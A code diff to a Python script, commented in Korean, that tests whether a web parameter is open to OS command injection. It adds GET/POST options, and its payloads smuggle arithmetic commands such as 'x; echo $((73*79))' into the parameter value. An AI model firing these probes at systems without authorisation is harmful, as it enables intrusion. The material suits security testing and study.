@@ -7,9 +7,7 @@
   - 그냥 반사되면 → "73*79" 라는 글자만 보이고 '5767' 은 없다
   → '5767' 이 보이면 명령이 진짜 실행된 것. 셸/OS 별로 분리자·문법이 달라 여러 개 시도.
 
-2026-08-25: fetch/verify 에 method="GET"|"POST" 인자 추가.
-GET 은 기존과 동일(쿼리스트링). POST 는 같은 payload 를 폼 바디로 보낸다.
-판정 로직(산술식 실행 결과 확인)은 요청 방식과 무관하게 동일 — 손 안 댐.
+GET/POST 둘 다 지원 — method 인자로 선택. 판정 로직은 요청 방식과 무관하게 동일.
 """
 import urllib.request
 import urllib.parse
@@ -20,18 +18,8 @@ PAYLOADS = ["x& set /a 73*79", "x; expr 73 \\* 79", "x; echo $((73*79))", "x| ec
 
 
 def fetch(base_url, param, value, method="GET"):
-    """
-    (원본)
-    def fetch(base_url, param, value):
-        url = base_url + "?" + urllib.parse.urlencode({param: value})
-        try:
-            with urllib.request.urlopen(url, timeout=5) as r:
-                return r.status, r.read().decode("utf-8", "replace")
-        except urllib.error.HTTPError as e:
-            return e.code, e.read().decode("utf-8", "replace")
-    """
-    # (변경) method="GET"|"POST" 인자 추가. GET 은 기존과 동일(쿼리스트링).
-    #        POST 는 같은 payload 를 폼 바디로 보낸다. (param, value 순서 유지)
+    """base_url 에 payload 를 실어 요청. (상태코드, 본문) 반환.
+       GET: ?param=value. POST: form-urlencoded 바디."""
     if method.upper() == "POST":
         data = urllib.parse.urlencode({param: value}).encode("utf-8")
         req = urllib.request.Request(
@@ -48,15 +36,6 @@ def fetch(base_url, param, value, method="GET"):
 
 
 def verify(base_url, param="host", method="GET"):
-    """
-    (원본)
-    def verify(base_url, param="host"):
-        for p in PAYLOADS:
-            _, body = fetch(base_url, param, p)
-            if RESULT in body:
-                ...
-    """
-    # (변경) method 인자 추가 → fetch 로 그대로 전달. 아래 판정 로직은 원본과 동일.
     for p in PAYLOADS:
         _, body = fetch(base_url, param, p, method)
         if RESULT in body:
